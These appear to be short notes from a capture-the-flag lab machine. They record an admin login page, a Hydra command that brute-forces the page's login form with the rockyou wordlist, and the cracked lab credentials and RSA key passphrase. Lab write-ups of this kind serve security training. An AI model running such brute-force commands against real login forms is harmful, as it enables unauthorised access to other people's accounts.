## Admin login page in /admin
![[bruteit6.png]]

## username for login in /admin
![[bruteit5.png]]
username - admin

## Hydra password crack of form
**Command** - 
```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.2.70 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V 
```
username - admin
password - xavier

## RSA key in /admin
![[bruteit7.png]]
rsa key passphrase - rockinroll